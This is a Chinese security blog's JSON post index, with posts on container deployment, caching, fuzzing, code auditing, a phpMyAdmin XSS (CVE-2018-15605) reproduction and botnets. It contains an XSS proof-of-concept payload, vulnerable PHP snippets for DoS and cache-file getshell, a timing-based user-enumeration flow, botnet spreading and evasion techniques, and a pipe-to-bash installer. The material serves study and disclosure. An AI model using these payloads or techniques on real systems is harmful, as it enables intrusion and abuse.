{"pages":[{"title":"404","text":"","path":"404/index.html","date":"07-26","excerpt":""},{"title":"about","text":"无业游民 死肥宅 网络安全爱好者 入门级编程 主要技能: 1. python 2. golang 3. JavaScript 4. web安全 5. 安全开发 6. 代码审计 7. web开发 8. 机器学习 次要技能 1. linux 2. 云计算 3. 区块链 4. 各种类型安全","path":"about/index.html","date":"07-26","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"07-26","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"07-26","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"07-26","excerpt":""}],"posts":[{"title":"容器部署从入门到入坟","text":"容器部署从入门到入坟本文主要简单介绍容器部署技术,并列出最简单体验方式和相关链接 Docker官网 www.docker.comDocker应该是最广为人知的. Docker是一个容器技术,通过将应用程序包装在容器 就可以轻松实现不同机器部署 而不需要额外安装的配置 . 而且因为主要使用linux的隔离技术,比虚拟机更轻量. 1G1核的vps上就能流畅运行. 适合人群希望节省自己安装和迁移时间的人.通过镜像就能轻松部署应用 而不需要学习如何安装 安装1wget get.docker.io | bash 就会自动安装docker并启动 使用1docker run hello-world 文档http://docs.docker.com 部署上一些不足多个应用程序的情况下可能需要启动多个容器,而docker程序并没有提供同时启动和管理多个容器的工具.像同时有数据库和服务器程序两个容器就需要分别停止和启动 docker-composedocker-compose是一款容器编排工具. 也就是同时定义和运行多个容器的应用程序.通过提供了一些有限的应用扩展功能. 但是需要额外提供一个docker-compose.yml文件来描述应用程序.性能上,并不需要额外的配置,只是单纯管理docker容器 . 官网 www.docker.com 适合人群自己部署的docker上的应用程序 使用了多个容器 安装123sudo curl -L \"https://github.com/docker/compose/releases/download/1.23.1/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-composedocker-compose --version 运行首先定义一个docker-compose.yml 12345678910111213141516171819202122232425# ./docker-compose.ymlversion: '3'services: db: image: mysql:5.7 environment: MYSQL_ROOT_PASSWORD: my_secret_pw_shh MYSQL_DATABASE: test_db MYSQL_USER: devuser MYSQL_PASSWORD: devpass ports: - \"9906:3306\" web: image: php:7.2.2-apache container_name: php_web depends_on: - db volumes: - ./php/:/var/www/html/ ports: - \"8100:80\" stdin_open: true tty: true 然后 1docker-compose up 文档https://docs.docker.com/compose/overview/ 部署上的不足docker和docker-compose都是单机应用, 不提供跨主机部署和管理. Kuberneteskubernetes是一个由Google创建的容器平台,提供部署,扩展和跨主机集群,自我修复等功能. 配置上 主节点编译Kubernetes需要2g内存以上 建议4g内存以上. 工作节点建议2g内存以上.生产环境上一般至少1个主节点和3个工作节点 官网 kubernetes.io适合人群希望在集群上部署自己容器应用程序,并得到方便部署, 可扩展性,自动修复等功能的企业 安装123456789101112apt-get update &amp;&amp; apt-get install -y apt-transport-https &amp;&amp; \\curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add - echo \"deb http://apt.kubernetes.io/ kubernetes-xenial main\" &gt; /etc/apt/sources.list.d/kubernetes.listapt-get update &amp;&amp; apt-get install -y kubelet kubeadm kubernetes-cnisudo kubeadm init --pod-network-cidr=10.244.0.0/16 # 这行需要加入.bashrcexport KUBECONFIG=/etc/kubernetes/admin.confkubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.ymlkubectl taint nodes --all node-role.kubernetes.io/master- 使用12kubectl create -f https://k8s.io/examples/pods/config/redis-pod.yamlkubectl get all --namespace=kube-system 文档https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/ 部署上一些不足还是需要在每台服务器手动安装和更新 boshbosh是一个云软件部署项目.可以在数百个vm上配置和部署软件.还提供了监控 故障恢复 更新软件等功能. cfcr是bosh的kubernetes部署项目.配置上, 如果bosh是vbox部署, 建议8g内存以上(仅bosh 和少量工作节点).在云平台上bosh部署需要2个vm, cfcr需要至少5个vm.默认配置vm上总cpu数&gt;10, 内存&gt;20g 适合人群使用云平台 并使用大规模集群的企业 gcp安装其他云平台请参考https://github.com/cloudfoundry/bosh-bootloader 1234567891011121314151617181920212223242526272829303132333435363738# install bosh cliwget https://github.com/cloudfoundry/bosh-cli/releases/download/v5.3.1/bosh-cli-5.3.1-linux-amd64chmod +x bosh-cli-5.3.1-linux-amd64mv bosh-cli-5.3.1-linux-amd64 /usr/local/bin/bosh# install packageapt-get install -y build-essential zlibc zlib1g-dev ruby ruby-dev openssl libxslt-dev libxml2-dev libssl-dev libreadline6 libreadline6-dev libyaml-dev libsqlite3-dev sqlite3 git clone https://github.com/cloudfoundry/bosh-bootloader/tree/master/plan-patches/cfcr-gcp bosh &amp;&amp; cd boshexport BBL_IAAS=gcpexport BBL_GCP_REGION=&lt;随便一个region&gt;export BBL_GCP_SERVICE_ACCOUNT_KEY=&lt;你的凭证json路径&gt;bbl up# https://github.com/cloudfoundry/bosh-bootloader/tree/master/plan-patches/cfcr-gcp# 例如 cfcr.bluebird.bizexport kubernetes_master_host=your-domain-heremkdir banana-env &amp;&amp; cd banana-envbbl plan --name banana-envcp -r ../plan-patches/cfcr-gcp/. .echo kubernetes_master_host=\\&quot;$&#123;kubernetes_master_host&#125;\\&quot; &gt; vars/cfcr.tfvarsbbl up# 以后每次使用bosh都需要在这个目录执行 建议写.bashrceval &quot;$(bbl print-env)&quot;bosh upload-stemcell https://bosh.io/d/stemcells/bosh-google-kvm-ubuntu-trusty-go_agent# url是cfcr的安装包 现在是最新的 以后需要自己更新bosh upload-release https://github.com/cloudfoundry-incubator/kubo-release/releases/download/v0.24.0/kubo-release-0.24.0.tgzgit clone git@github.com:cloudfoundry-incubator/kubo-deployment.gitexport KD=$(pwd)/kubo-deploymentbosh deploy -d cfcr $&#123;KD&#125;/manifests/cfcr.yml \\-o $&#123;KD&#125;/manifests/ops-files/iaas/gcp/cloud-provider.yml \\-o cfcr-ops.yml -v deployment_name=cfcr \\-l &lt;(bbl outputs) 使用12bosh -d cfcr run-errand apply-specsbosh -d cfcr run-errand smoke-tests 文档https://bosh.io/docs/","path":"2018/11/14/容器部署从入门到入坟/","date":"11-14","excerpt":""},{"title":"记忆术漫谈","text":"记忆术是畅销书元素之一，像如何高效记忆 : 美国更权威、流传更广的记忆教程，畅销40年，博客来百大学习新知类年,超右脑照相记忆法 : 快速唤醒右脑照相记忆功能之流 仿佛看了买了这本书阅读 明天就能过目不忘。当然这些贩卖焦虑之类的议题和本文无关。本文探讨一下记忆术和记忆术的本质。 记忆术记忆术是一种帮助记忆的技巧 如 化学口诀 英语缩写 联想 然而书中是 独创的“记忆系统“ 独创的&quot;xx方法&quot; 显然只是一些把本质掩盖的包装 本文讨论将只是本质 考虑记忆术的本质 自然不能脱离记忆 记忆(Memory)是神经系统存储过往经验的能力 广为接受的模型将记忆过程分为三个不同阶段： 编码：获得资讯并加以处理和组合。 储存：将组合整理过的资讯做永久纪录 检索：将被储存的资讯取出，回应一些暗示和事件 编码作为理科生(误) 说到编码自然想到信息论.事实上众多记忆术只是对信息论的一种包装. 以记忆单词为例 (下文均为如此) 简单化模型 下文会详细论述英语记忆 考虑两个虚构的单词 singer teacher 如果单个字母记忆 一共有13个字母 假设一个字母信息为1(使用真正的信息熵计算可能会过于繁琐) 需要记忆的信息为13但是我们知道er是一个后缀 所以如果将er作为一个特殊字母单独记忆 记忆消耗为2 信息一共是11 以上只是一个简单的例子 但是应该可以看出记忆术的本质有压缩信息量 在此不对压缩信息技巧展开探讨 有兴趣的请参考相关资料 储存记忆术在储存上有例如联想记忆术 形象记忆法.在直接看到本质定义后 考虑一个储存可能有什么属性与记忆相关以下是作者列出的 欢迎补充 结构 大小 实际容量 所以记忆术本质上只是对储存属性的定义.考虑一个例子 图像记忆法图像并不是很好的记忆结构 但是他的大小是整个图片 实际容量没有提高 所以这类记忆法本质上只是提高了信息量 丢失会更加困难 考虑第二个例子 联想记忆术只是人为添加了记忆的相互结构 考虑第三个例子 口诀口诀算碳找拐点，求氢四里减不但压缩了信息量 也在一句话中增加了更多信息 检索检索依赖于储存时的结构 记忆术并没有太大作为 英语记忆英语是由字母组成的 但是从语言学角度来讲 字母并不是真正的有意义构成部分 真正语言单位是语素 语言是由语素 单词 语法构成的 unbreakable这个字有三个语素：un-（不自由语素）、break（自由语素）、-able（不自由语素） 维基百科 英语的非自由语素从记忆角度又可以大致分为前缀,后缀,词根 如果单词可记忆的语素更多 每个单词的平均信息量就会更少 这个已经是老调重弹,有关词根 前缀 后缀的书已经浩如烟海了 考虑一个单词的记忆由什么组成. 读 记忆一个单词对应的中文 写 记忆一个中文对应的英文 都是一个对应 显然作为母语的中文记忆会更简单 也就是为什么读比写容易事实上作为IT人员 经常处于英语环境 在英语起步时会得到加成 因为在环境中会不自主的记忆下单词 但是不知道是什么意思 也就是说对应已经形成 只是没有填充对应的含义 而填充是非常简单的 单纯背诵的效果是不令人满意的 因为并没有在储存时形成结构 也没有更多信息量. 我们记忆的主结构是所处现实,检索任何东西也都是从所处现实开始的 比如说作者现在使用githubpage 提到git 作者从记忆中检索到的肯定是git这个工具 而不是它的英语含义混账 英语环境学到英语快且不易遗忘 因为记忆储存是直接在所处现实 而像中文环境背诵学英语需要额外构建一个英语记忆结构.一个结论就是基于这个的 在生活学英语 虽然我们生活并没有英语 但是可以像记忆术一样刻意构造你的记忆结构 强行挂载到你的现实记忆结构(作者注:这需要很大努力) 结语本文大致分析了大部分记忆术的本质 如果你看完本文也准备去写一本记忆术的书 只需要请作者喝杯咖啡(笑)","path":"2018/10/07/记忆术漫谈/","date":"10-07","excerpt":""},{"title":"缓存漫谈","text":"cache已经成为互联网不可或缺的一部分，日常也无时无刻的使用着。这篇博客试讨论一下cache. 定义是什么cache是什么，和储存有什么区别？ 首先cache最大的特点就是易失性，也是唯一物理本质上的区别。 Cache一词来源于1967年的一篇电子工程期刊论文。其作者将法语词“cache”赋予“safekeeping storage”的涵义，用于计算机工程领域。 维基百科凡是位于速度相差较大的两种硬件之间，用于协调两者数据传输速度差异的结构，均可称之为Cache。 用途是什么几乎我们使用的每样东西都使用了缓存 cpu，硬盘，os，服务器。既然都是储存 使用cache的目的是只有调节速度差异(提高速度)么。试观察缓存起到的作用.以动态网站的缓存为例.我们无缓存需要经过一个完整流程 1服务器程序处理请求-&gt;网站程序接受请求-&gt;程序操作-&gt;数据库处理-&gt;返回页面 如果进行缓存1服务器程序处理请求-&gt;网站程序接受请求-&gt;减少部分的程序操作-&gt;返回页面 如果无缓存 需要经过额外的程序 提高了程序消耗 增加了n次数据库处理 节省消耗 再试考虑如果数据库故障了 缓存可用 提高可用性 提高速度 节省消耗 提高可用性 常用缓存有什么?如何评价一个缓存效果?在建模时缓存常常被分为一个层，该如何评价一个缓存层效果呢 以下以web应用缓存为例 其他缓存应该也可以应用 分布式 容灾等暂不纳入讨论范围 最常见的评价指标应该是缓存命中率了缓存命中率 = 缓存命中数/请求数然而这个指标很明显是依赖于开发者实现 只能在具体应用测量 无法估计. 但是我们可以考虑它的关系 时间空间矛盾性 缓存占用空间与命中率成正比 考虑性能指标 从用途分别评价 读者应该也能列出类似以下的指标 以下非严谨指标 仅供参考 提高速度 提速率 = 1 - 缓存命中消耗时间/未命中消耗时间节省消耗 节省消耗率 = 1 -缓存命中消耗资源/未命中消耗资源提高可用性 提高可用率 = 缓存覆盖率可用性 可用率 = 1-缓存丢失率 不管存放在哪里 都有物理上故障的可能性 当然这些只是简单指标 需要具体量化 如文件缓存需要多读一次文件 但节省了一次数据库请求 节省消耗率是多少 以服务器为视角 常用缓存都可以从获取渠道分为内存,文件,网络 从上面的2个指标+单位成本估计 (提高可用性,节省消耗率基本一致) 内存 文件 网络 提速率 高 较高 一般 单位成本 高 低 视具体使用技术而定 可用率 中 低 视具体使用技术而定 该使用什么缓存?怎么用?首先我们考虑能在什么地方使用缓存 上一个小节我们关注了web应用自身的缓存 但是缓存每个环节都可以使用 引用一张图 来自美团技术团队 原文地址 https://tech.meituan.com/cache_about.html 从浏览器开始JavaScript ServiceWorker 是现在流行的前端技术 Service workers 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。 通过这个技术可以让web开发人员轻松的控制缓存。 如果没有这个技术呢? 也可以通过cache-control头进行缓存 发起了真正的请求 静态文件应该都知道cdn服务器接受到了请求 使用内存/文件/网络缓存 分别应该在什么时候使用? 单机情况下内存和文件只是成本和速度区别,网络缓存未必要使用. 集群根据位置 缓存也可以分为本地缓存/分布式缓存 网络缓存属于分布式缓存如果是一个服务器集群 本地缓存会导致服务器无法共享 如一台服务器绝无可能去读另一台服务器的内存缓存 导致都要独立缓存造成大量浪费.同时存在一个缓存一致性的问题.如果属于分布式缓存 服务器集群都可以共享一个缓存 一个系统中的问题不能通过转移到另一个同等系统来解决 只能变成另一个问题 由于单机缓存服务器不可能支持集群的访问 只能形成集群 然而集群又引入了上面的问题 缓存算法如果要实现一个缓存系统 需要一些算法 缓存特点的主要有清空算法,预测算法.清空算法并没有明显优劣 本质上只是清空认为最无用的缓存 在不同场景需要选择不同清空算法123456789101112131415161718192021# 来自https://tech.meituan.com/cache_about.html的列表常见的一般策略有：FIFO(first in first out)先进先出策略，最先进入缓存的数据在缓存空间不够的情况下（超出最大元素限制）会被优先被清除掉，以腾出新的空间接受新的数据。策略算法主要比较缓存元素的创建时间。在数据实效性要求场景下可选择该类策略，优先保障最新数据可用。LFU(less frequently used)最少使用策略，无论是否过期，根据元素的被使用次数判断，清除使用次数较少的元素释放空间。策略算法主要比较元素的hitCount（命中次数）。在保证高频数据有效性场景下，可选择这类策略。LRU(least recently used)最近最少使用策略，无论是否过期，根据元素最后一次被使用的时间戳，清除最远使用时间戳的元素释放空间。策略算法主要比较元素最近一次被get使用时间。在热点数据场景下较适用，优先保证热点数据的有效性。除此之外，还有一些简单策略比如：根据过期时间判断，清理过期时间最长的元素；根据过期时间判断，清理最近要过期的元素；随机清理；根据关键字（或元素内容）长短清理等。 cpu预测分支技术已经非常成熟 但是web缓存预测并没有生产使用 还是停留在论文上 主要存在什么问题? 首先就是没有足够泛用和正确率的算法 从论文上可以看出 近年主要用的都是ai技术 虽然现在ai吹的很飘 但是在这个问题上并没有得出很好的解决方案. 同时需求并没有那么大 需要缓存预测技术的只是数据量极大的网站 如推特 缓存安全问题作为一名安全爱好者 谈谈安全问题.而且通过安全问题 也能显示缓存一些本质问题. 缓存穿透简单来说 就是缓存未命中 直接命中服务器 大量这种请求可能造成服务器不可用. 但是从这个定义来看充其量只是回到没有缓存 并不是安全问题 有什么危害?缓存本质也是储存 需要储存消耗 如果新缓存命中率极低可以认为该请求消耗资源为 原请求资源+储存缓存资源 而且新缓存挤压其他缓存可能造成原会命中的缓存被清空 web缓存投毒缓存实现为键值结构 意味着什么呢? 如果键一样就会返回一样的内容,如果以外的东西也有影响呢? 考虑我们使用路径作为键也就是1GET /test 键为/test 然而http头还有其他字段 如果取cookies显示12&lt;?phpecho $COOKIES[&quot;test&quot;] 会导致self-xss漏洞 原本没什么危害 但是缓存会导致其他用户也访问到这个页面 缓存写问题这个问题只存在与文件缓存 首先web缓存会缓存页面 页面内容是可信的么? 如果缓存一些用户内容 可能导致任意写文件内容.在php这种动态脚本语言 只要有.php文件就会运行 如果.php缓存文件在web服务器 名字可被猜测 就相当于任意在你服务器运行php代码.","path":"2018/10/06/缓存漫谈/","date":"10-06","excerpt":""},{"title":"如何使用工具快速进行fuzz","text":"fuzz工具非常多 如libfuzz honggfuzz KernelFuzzer 也有专注进行web fuzz的wfuzz 但是fuzz功能可以分成两种 只是生成测试用例和检测程序使用测试用例后异常 这次使用radamsa和afl作为这两类工具 radamsa安装官方给出的命令1234$ # please please please fuzz your programs. here is one way to get data for it:$ sudo apt-get install gcc make git wget$ git clone https://gitlab.com/akihe/radamsa.git &amp;&amp; cd radamsa &amp;&amp; make &amp;&amp; sudo make install$ echo \"HAL 9000\" | radamsa 如何使用12$ echo \"aaa\" | radamsaaaaa echo &quot;aaa&quot;可换成任意输出内容的命令 如cat test.txt 常用选项12345678910111213-o / --output 指定输出方法-o - 输出到终端-o output.txt 输出到文件-o :80 网络请求 适用于对服务器程序fuzz--seek num 指定随机数 用来方便复现-g | --generators 指定输入-g stdio 默认从命令行输出获取-g file filename 读文件-g random 随机数据-n 生成数量 fuzz 命令行程序从命令行读取数据典型就是md5sum测试fuzz命令例子echo &quot;test&quot; | radamsa | md5sum - 当然不可能fuzz一次就执行一行命令 编写一个简单的脚本shell or python? python! 123import os while True: ret = os.system(&apos;echo &quot;test&quot; | radamsa | md5sum -&apos;) 只是简单的单线程执行 但是存在两个问题 如何记录崩溃和崩溃输入 这个时候-seek就能使用了 同时通过判断system函数的返回值 修改为 1234567import os num = 0 while True: ret = os.system(&apos;echo &quot;test&quot; | radamsa -seek &#123;&#125;| md5sum -&apos;.format(num)) num = num +1 if ret != 0: with open（&quot;crash.txt&quot;,&quot;w+&quot;） as f f.write(&quot;&#123;&#125;\\n&quot;.format(num)) 我们的第一个fuzz程序(虽然这个脚本很简陋) 文件fuzz和命令行主要区别只是读取方式和 文件格式一般会有一定要求 否则不能进入程序执行流程.所以一般fuzz严格的文件格式要使用专门的生成框架. 生成fuzz文件方法很简单echo &quot;test&quot; | radamsa --output &#39;testfile&#39; 读取文件生成radamsa --output &#39;testfile&#39; -g file testfile 网络fuzz虽然radmasa提供了这个选项 由于协议格式基本都是一个错误字节就报错 所以推荐使用Mutiny来进行网络fuzzecho &quot;test&quot; | radamsa --output &#39;:80&#39; afl介绍这款工具除了可以自动从输入fuzz 还能自动检测崩溃 超时. 最大亮点是使用了 编译器插桩 在运行时通过编译时插入的代码可以了解到代码运行路径 覆盖率等信息 安装12345wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgztar -xf afl-latest.tgzcd afl*makemake install 使用常用参数12345alf-fuzz programs-i 样本目录 fuzz时会使用这些样本生成fuzz文件-o 输出目录 生成fuzz文件存放目录-n 普通fuzz模式 只有检测崩溃功能 不能检测路径覆盖率-q qmeu模式 例子1afl-fuzz -i test/markdup/ -o out -n md5sum - 实际操作从github选一个作为实际对象 我使用高级搜索 指定&gt;500star c语言的项目后随意找了一个1git clone https://github.com/samtools/samtools 实际选择指南 star星数是很好的指标 代表发现的漏洞的影响力 选择 c/c++ 优先选择可以直接编译成程序的 fuzz库还需要去学习怎么写成库入口程序进行fuzz 优先选择有完善的测试用例的 如jpg xml 或者自带 代码越多漏洞越多 如果是本地命令行程序或难以利用的程序 做好发现漏洞被忽略的准备 需要使用afl-gcc执行了编译 常用将gcc替换成afl-gcc的方法 (如果不经常进行编译)12CC=你的afl路径/afl-gccexport CC 然后1make 实际使用编译工具不同 可能需要查询文档 当然你只fuzz不做其他编译直接mv afl-gcc gcc也行 编译1234567apt-get install autoconf automake make gcc perl zlib1g-dev libbz2-dev liblzma-dev libcurl4-gnutls-dev libssl-dev libncurses5-devgit clone https://github.com/samtools/htslib git clone https://github.com/samtools/bcftoolscd samtoolsautoheaderautoconf -Wno-syntax./configure 确认输出中的 checking for gcc... xxxx 是你的afl-fuzz 如果不是请执行上面的替换方法 1make 这个程序提供了测试用例在test目录 如果fuzz其他程序没有提供 就需要自己寻找需要注意几点 尽量覆盖全部可能的格式 畸形并符合文件格式 不要存在大量无用数据 像一个3000像素大小的红色正方形图片比一个30像素的 在fuzz时并没有功能提升 只会让fuzz程序大量修改到没有用的图片数据区 这个samtools 有多个功能 我们测试split这个功能 (q:为什么 a:因为我只在这个找到了崩溃 你想试试其他功能和用例也可以)1afl-fuzz -i test/markdup/ -o out samtools split @@ 稍等一会 就可以看到产生了崩溃 停止后 文件保存位置 你选择的输出目录这次是out/crashes/ 测试崩溃./samtools split out/crashes/id:000000,sig:11,src:000015,op:flip2,pos:2应用崩溃了fish: “./samtools split out/crashes/id…” terminated by signal SIGSEGV (Address boundary error) 之后?可以选择构造exp当自己的0day 或者提交给开发者 我是倾向于提交给开发者的 而且构造exp已经有很多书籍 提交是什么通知开发者程序存在问题 让开发者进行修复。 怎么提交?根据程序开发者的不同 具体可能是(非全面) 小型商业公司 无漏洞奖金计划 我们可以从网上找到它的联系邮件 邮件通知 大型商业公司 有漏洞奖金计划 使用计划中的提交方式 开发者 非开源 邮件通知 开发者 托管在github等 如果问题不大可以直接使用issue 如果是远程利用之类请通知开发者 一般都需要提供以下信息 os信息 程序版本信息 崩溃样本 其他信息 为什么要提交?修复漏洞 防止用户收到攻击 为网络安全做贡献 当然也有其他现实因素 比如危害太小不提交也没用 简历加分等等","path":"2018/09/20/fuzz/","date":"09-20","excerpt":""},{"title":"审计一些不太常见的点","text":"博客好久没更新了，主要是没什么像0day之类的分享 漏洞分析大洞早被分析了 小洞也没什么意思.以后应该会主要分享一些思路吧 审计代码的时候很多人都爱审计sql注入，直接上传文件.但是往往都很难找到。 这篇博客主要谈谈可能不是太重视的两个点 dos前段时间流行的验证码dos就是很好的例子 这个漏洞也可能出现在cms中.一段典型的漏洞代码(来自某cms) 1234567891011121314151617181920 // 直接获取宽度 $width=0;if (isset($_GET['width']) &amp;&amp; intval($_GET['width']))&#123; $width = intval($_GET['width']);&#125;$height=0;// 直接获取高度if (isset($_GET['height']) &amp;&amp; intval($_GET['height']))&#123; $height = intval($_GET['height']);&#125; $config = array( // less code 'imageH' =&gt; $height, // 验证码图片高度 'imageW' =&gt; $width, // 验证码图片宽度 // less code);$Verify = new \\Think\\Verify($config);$Verify-&gt;entry(); 可以看到验证码宽高直接由用户控制 而生成验证码属于高消耗动作 将宽高设置极高可以消耗大量服务器资源 造成dos的主要情况是服务器执行的代码中影响资源消耗的参数可控 常见于控制代码循环次数/验证码 cachecache涉及到直接文件操作 防护不当极易造成getshell 而且开发人员目前在这方面防护意识还不是非常强 典型漏洞函数如1234567891011121314function sp_get_routes($refresh=false)&#123; // less code$routes=M(\"Route\")-&gt;where(\"status=1\")-&gt;order(\"listorder asc\")-&gt;select();$route_dir=SITE_PATH.\"/data/conf/\";if(!file_exists($route_dir))&#123; mkdir($route_dir);&#125;$route_file=$route_dir.\"route.php\";file_put_contents($route_file, \"&lt;?php\\treturn \" . var_export($all_routes) . \";\");return $cache_routes; &#125; 如果此数据可控就是getshell 由于route是在后台控制 所以这个只是后台getshell cache也是侧信道攻击的途径之一 web侧信道攻击也是有存在可能性的 如果cache命中导致的加速明显到可测量和cache命中泄露了敏感信息 如某样东西是否存在 就可能存在侧信道攻击 一个可能的web侧信道攻击流程例子 存在一个cache机制 缓存了用户信息(有明显提速) 并可以在任意访问的接口使用了此缓存 如登陆 攻击者尝试登陆(假设无验证码或易破解) 如果用户不存在 不会命中缓存 如果用户存在 第二次登陆会得到提速 攻击者通过二次登陆的响应速度测量可获得该用户是否存在的信息 如果使用了手机号作为用户名 可能通过枚举获取注册用户的手机号","path":"2018/09/20/审计一些不太常见的点/","date":"09-20","excerpt":""},{"title":"CVE-2018-15605 ","text":"漏洞信息在4.8.3之前在phpMyAdmin中发现了一个问题。已发现跨站点脚本漏洞，攻击者可以使用精心设计的文件来操作通过导入功能加载该文件的经过身份验证的用户https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15605 影响版本phpmyadmin&lt; 4.8.3 复现环境搭建惯例 上docker mysqldocker run --name mysql2 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=a7552659 -d mysql:5.7 phpmyadmindocker run --name admin -d --link mysql2:db -p 8080:80 phpmyadmin/phpmyadmin:4.8.2 然后就可以在127.0.0.1:8080访问到了 拷贝代码分析git clone https://github.com/phpmyadmin/phpmyadmin 代码简单分析查看修复提交 https://github.com/phpmyadmin/phpmyadmin/commit/00d90b3ae415b31338f76263359467a9fbebd0a1 只修改了一行libraries/classes/Sql.php$message = Message::notice($warning);-&gt;$message = Message::notice(Message::sanitize($warning)); 那么很明显漏洞点就是这里 查看$warning引入点第2220行 $warning_messages = $operations-&gt;getWarningMessagesArray(); 跳入getWarningMessagesArray();123456789101112131415161718192021public function getWarningMessagesArray() &#123; $warning_messages = array(); foreach ($GLOBALS[&apos;dbi&apos;]-&gt;getWarnings() as $warning) &#123; // In MariaDB 5.1.44, when altering a table from Maria to MyISAM // and if TRANSACTIONAL was set, the system reports an error; // I discussed with a Maria developer and he agrees that this // should not be reported with a Level of Error, so here // I just ignore it. But there are other 1478 messages // that it&apos;s better to show. if (! (isset($_REQUEST[&apos;new_tbl_storage_engine&apos;]) &amp;&amp; $_REQUEST[&apos;new_tbl_storage_engine&apos;] == &apos;MyISAM&apos; &amp;&amp; $warning[&apos;Code&apos;] == &apos;1478&apos; &amp;&amp; $warning[&apos;Level&apos;] == &apos;Error&apos;) ) &#123; $warning_messages[] = $warning[&apos;Level&apos;] . &apos;: #&apos; . $warning[&apos;Code&apos;] . &apos; &apos; . $warning[&apos;Message&apos;]; &#125; &#125; return $warning_messages; &#125; 是从getWarnings()引入 查找定义虽然IDE不能直接跳转getWarnings() 使用全局搜索 也能找到在libraries\\classes\\DatabaseInterface.php1234public function getWarnings($link = DatabaseInterface::CONNECT_USER) &#123; return $this-&gt;fetchResult(&apos;SHOW WARNINGS&apos;, null, null, $link); &#125; fetchResult实际上是一个sql查询 在这里的语句是SHOW WARNINGS 漏洞源找到了 查看getWarningMessagesArray的调用这里直接给出文件import.php 718行-&gt;executeQueryAndGetQueryResponse-&gt;getWarningMessagesArray 查看调用上下文 赋值给了$html_output然后直接调用$response-&gt;addHTML($html_output); 查看123456789101112public function addHTML($content) &#123; if (is_array($content)) &#123; foreach ($content as $msg) &#123; $this-&gt;addHTML($msg); &#125; &#125; elseif ($content instanceof Message) &#123; $this-&gt;_HTML .= $content-&gt;getDisplay(); &#125; else &#123; $this-&gt;_HTML .= $content; &#125; &#125; 无任何过滤 直接添加到html内容 那么如何注入payload呢,我们查看mysql文档(实际上我是先谷歌了一下) 发现有signal 来产生警告文本 我们写一个sql文件 然后通过导入功能导入 成功弹窗poc SIGNAL SQLSTATE &#39;01000&#39; SET MESSAGE_TEXT = &#39;Warning: &lt;/p&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#39;; 后言这个漏洞影响/危害都不大 利益条件非常苛刻 毕竟都让人执行sql文件了形成原因其实完全是程序员疏忽 以为这里警告信息是安全的 没加过滤","path":"2018/08/24/CVE-2018-15605/","date":"08-24","excerpt":""},{"title":"telegraph机器人","text":"写了个小telegraph机器人 调用yunsee.cn的查询功能项目地址 https://mail.google.com/mail/u/1/#inboxtg机器人 t.me/yunsee_bot","path":"2018/08/18/tgbot/","date":"08-18","excerpt":""},{"title":"僵尸网络","text":"此文是学习的一些自我总结 僵尸网络僵尸网络是由众多肉鸡和网络控制者组成，网络控制者通过传播木马,漏洞利用等途径抓肉鸡，并通过命令服务器控制整个网络. 传播方法弱口令最简单（辣鸡）的方法就是通过服务器弱口令，使用一些类似nmap，zmap全网扫描 再使用一些爆破工具 如Hydra. 操作简单，但是成功率非常小.*随着物联网的发展 用户对物联网设备的疏忽大意 导致现在出现了大量IoT僵尸网络 传播木马一些下载站捆绑的软件就是木马 下载完就变成肉鸡了.或者提供一些类似于黑客工具 用捆绑木马骗小白们下载. 这种方式操作复制 因为让别人下载并运行也不是一件容易的事，但是如果免杀做得好 成功率基本100% 远程攻击通过收集一些rce exp 在全网搜索引擎找到合适目标 进行攻击。操作也简单，成功率很高.但是能成功的数量可能不多，还是万人骑 获取命令渠道 IPC-&gt;HTTP/DNS-&gt;社交网络 IPC 通过IPC频道下发命令HTTP/DNS 通过http请求/dns请求来下发命令社交网络 通过qq空间/推特推文之类下发命令 可以发现是越来越隐蔽的 防火墙从屏蔽IPC到屏蔽域名/ip 但一般不可能把推特/qq也给屏蔽掉 僵尸网络的攻与防打击僵尸网络从僵尸网络诞生就没停止过，僵尸网络技术与检测技术都是不断发展 终端攻防安全软件/服务供应商(如云供应商)可以将木马检测删除. 但成熟的木马都做了随时代发展的混淆/免杀 难以查杀 以及用户安全意识不强 点信任此软件导致防御失败 下发命令渠道通过防火墙将检测出来的僵尸网络请求拦截，传统方法是通过人工定的规则.随着机器学习的技术的发展 通过机器/深度学习来检测僵尸网络的技术发展了起来 但是并没有有足以商用的，因为网络请求0.1误报率就足以让人不去使用 但可以期待以后通过机器/深度学习将僵尸网络通信拦截. 获取命令渠道一直在发展 像通过社交网络的渠道去获得命令 防火墙完全不可能查出来 命令服务器通过向IP提供商/云服务器供应商/域名供应商投诉 使命令服务器关闭 破坏僵尸网络 僵尸网络的命令服务器网络结构发展 中心化(单命令服务器)-&gt;中心化(多命令服务器)-&gt;星形(多命令服务器,分别负责一部分)=网状(p2p 无命令服务器 bot之间平权) 逐渐不再中心化 减轻了命令服务器被破坏导致僵尸网络的破坏 fast flux传统上通过使用循环dns (为单个域名 返回多ip)并频繁更换dns记录的ip地址 可以隐藏背后真实的ip地址 就算被发现了并封停 也通过更换dns记录的ip保持僵尸网络。 缺点显然是需要域名不被封停，因为注册服务商不愿意这样做 可能因为是他们的主要客户并且所在地区无法律要求封停 DGA通过使用一些随机种子和域名生成算法(DGA)生成大量域名 并作为命令服务器。 作者提前注册。由于生成的大量域名难以全加到防火墙规则和封停和购买域名成本并不高 是一种有效防止封停命令服务器的方法。但使用机器学习检测DGA已经逐渐成熟，将来很可能会被防火墙拦截.如果作者没有全部注册 可能导致抢注域名 （需要逆向分析出dga算法和服务器端算法） 社交网络在社交网络 举报成功或者联系客服都能使得账号被封停。 在前沿领域已经有人使用了类似与DGA的用户生成算法 作者虽然几率比较小 但是还是有的 史上最强僵尸网络 Mirai 